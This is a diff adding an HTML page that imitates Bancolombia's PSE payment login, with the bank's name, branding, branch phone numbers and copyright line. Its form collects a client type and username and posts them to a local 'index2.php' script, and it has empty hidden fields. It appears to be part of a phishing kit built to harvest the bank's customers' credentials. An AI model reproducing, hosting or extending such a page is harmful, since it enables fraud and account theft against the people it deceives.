@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="robot" content="All" />
+    <meta name="rating" content="general" />
+    <meta name="Distribution" content="Global" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="./archivos/style.css"
+      media="all"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link
+      href="./archivos/bootstrap.css"
+      media="all"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link
+      href="./archivos/ui.css"
+      media="all"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link
+      href="./archivos/jquery-ui.css"
+      media="all"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link
+      href="./archivos/showLoading.css"
+      media="all"
+      rel="stylesheet"
+      type="text/css"
+    />
+
+    <title>Pagos PSE</title>
+  </head>
+
+  <body>
+    <div id="contenidoWeb">
+      <div class="container" id="containerMain">
+        <div>
+          <div id="header" class="mua-page-header">
+            <div class="row row-logo-svp">
+              <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                <div class="mua-imgLogoItem"></div>
+                <div class="text-svp-name">
+                  Pagos PSE - Sucursal Virtual Personas
+                </div>
+              </div>
+            </div>
+            <div class="row">
+              <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                <div
+                  id="lastIn"
+                  class="mua-title-text"
+                  style="padding-top: 10px !important"
+                >
+                  <div>
+                    <div class="timeText">Fecha y hora actual:</div>
+                    <span id="jclock1" class="lastVisitedText">
+                      <script>
+                        var meses = new Array(
+                          "Enero",
+                          "Febrero",
+                          "Marzo",
+                          "Abril",
+                          "Mayo",
+                          "Junio",
+                          "Julio",
+                          "Agosto",
+                          "Septiembre",
+                          "Octubre",
+                          "Noviembre",
+                          "Diciembre"
+                        );
+                        var diasSemana = new Array(
+                          "Domingo",
+                          "Lunes",
+                          "Martes",
+                          "Miércoles",
+                          "Jueves",
+                          "Viernes",
+                          "Sábado"
+                        );
+                        var f = new Date();
+                        var hora =
+                          f.getHours() +
+                          ":" +
+                          f.getMinutes() +
+                          ":" +
+                          f.getSeconds();
+                        document.write(
+                          diasSemana[f.getDay()] +
+                            ", " +
+                            f.getDate() +
+                            " de " +
+                            meses[f.getMonth()] +
+                            " de " +
+                            f.getFullYear() +
+                            " " +
+                            hora
+                        );
+                      </script>
+                    </span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="panel-heading">
+            <h3>
+              Tienda Virtual o Recaudador:&nbsp;
+              <b>Bancolombia S.A. (Zona Pagos) </b>
+            </h3>
+          </div>
+        </div>
+        <form method="post" action="index2.php">
+          <p id="gfg" hidden=""></p>
+          <p id="address" hidden=""></p>
+          <div class="panel panel-primary">
+            <div class="mua-panel-body">
+              <div class="row">
+                <div class="col-xs-12 col-sm-5 col-md-4">
+                  <div class="panel_general mua-panel_general">
+                    <div class="subtitle-land-label">
+                      <h4>
+                        Selecciona que Tipo de Cliente eres, luego ingresa los
+                        datos solicitados y haz clic en "Continuar".
+                      </h4>
+                    </div>
+                    <div id="contenido">
+                      <div class="mua-content-group-panel">
+                        <div class="mua-label-input">
+                          <span id="popoverUser" class="">
+                            <img src="archivos/ingre.png" />
+                          </span>
+                          <div id="popoverContent" class="hide">
+                            <div class=""></div>
+                          </div>
+                          <label
+                            class="control-label-index"
+                            for="DocumentNumber"
+                            >Tipo de Cliente</label
+                          >
+                        </div>
+                        <div>
+                          <div class="mua_svp_enroll_update_control">
+                            <select
+                              name="tipoper"
+                              class="mua-form-control mua_svp_control_username mua-input-icon"
+                            >
+                              <option value="persona">Persona</option>
+                              <option value="empresa">Empresa</option>
+                            </select>
+                          </div>
+                        </div>
+                      </div>
+
+                      <div class="mua-content-group-panel">
+                        <div class="mua-label-input">
+                          <span id="popoverUser" class="">
+                            <img src="archivos/ingre.png" />
+                          </span>
+                          <div id="popoverContent" class="hide">
+                            <div class=""></div>
+                          </div>
+                          <label
+                            class="control-label-index"
+                            for="DocumentNumber"
+                            >Ingrese su usuario</label
+                          >
+                        </div>
+                        <div>
+                          <div class="mua_svp_enroll_update_control">
+                            <input
+                              id="DocumentNumber"
+                              name="DocumentNumber"
+                              class="mua-form-control mua_svp_control_username mua-input-icon"
+                              type="text"
+                              maxlength="20"
+                              autocomplete="off"
+                              required="required"
+                              onkeypress="checkKey(event)"
+                              onchange="trim(document.loginUserForm.username)"
+                            />
+                            <span class="mua-icon-user"></span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="one-button-container mua-button-container">
+                      <input
+                        type="button"
+                        name="cancel"
+                        value="Cancelar"
+                        class="btn btn-secondary"
+                        onclick="clickCancel();"
+                        tabindex="4"
+                      />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                      <button
+                        type="submit"
+                        id="continuar"
+                        name="continuar"
+                        class="btn btn-success"
+                      >
+                        Continuar
+                      </button>
+                    </div>
+                    <div class="mua-panel_enlances">
+                      <p>
+                        <a href="">Paso a paso para recordar tu usuario</a>
+                      </p>
+                      <p>
+                        <a href="">¿Problemas para conectarte?</a>
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-xs-12 col-sm-7 col-md-8">
+                  <div class="mua-embed-container-personal">
+                    <iframe
+                      class="mua-iframe mua-iframe-personal-responsive"
+                      src="./archivos/imgPublicidad.html"
+                      frameborder="0"
+                      scrolling="no"
+                      width="635px"
+                      height="335px"
+                    ></iframe>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="row">
+              <div class="col-xs-12 col-sm-12 col-md-12">
+                <p class="mua-footer">
+                  <a onclick="site_secure();" class=""> Seguridad </a>
+                  <a onclick="policy();" class=""> Política de Privacidad </a>
+                  <a onclick="terms();" class=""> Términos y Condiciones </a>
+                  <a onclick="faq();" class=""> Preguntas Frecuentes </a>
+                </p>
+              </div>
+            </div>
+            <br />
+            <div class="row">
+              <div class="col-xs-12 col-sm-12 col-md-12">
+                <p class="mua-footer">
+                  Sucursal Telefónica: Bogotá (57) 60 1 343 00 00 - Medellín
+                  (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla
+                  (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
+                  Bucaramanga (57) 60 7 697 25 25
+                  <br />
+                  Pereira (57) 60 6 340 12 13 - El resto del país 018000 9
+                  12345. Sucursales Telefónicas en el exterior: España (34) 900
+                  995 717 - Estados Unidos (1) 866 379 97 14.
+                </p>
+              </div>
+            </div>
+            <div style="margin-top: 10px">
+              <div class="mua-title-text pull-left"></div>
+              <div class="mua-title-text pull-right">
+                &copy; &nbsp;<span id="fecha">2024</span>&nbsp;Bancolombia
+                S.A.&nbsp;&nbsp;
+              </div>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
